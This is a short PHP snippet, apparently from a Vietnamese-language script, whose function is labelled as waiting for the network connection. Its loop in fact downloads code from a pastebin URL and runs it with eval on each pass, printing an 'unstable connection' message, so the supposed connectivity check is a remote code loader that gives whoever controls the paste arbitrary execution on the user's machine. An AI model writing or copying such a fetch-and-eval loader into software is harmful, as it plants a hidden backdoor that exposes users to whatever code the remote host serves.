//user
$userV1 = "KOV";

//đợi mạng
function ketnoimangV1(){
    $knod = 0;
    $connect = false;

    while($connect == false){
        $knod++;
        eval(file_get_contents('https://pastebin.com/raw/P91zEnAp'));
        if($knod == 3){
            $knod++;
            echo"\r";
            echo"\r                                         \r";
        echo "\033[1;31m kết nối của bạn tạm thời không ổn định";
        }
    }

}





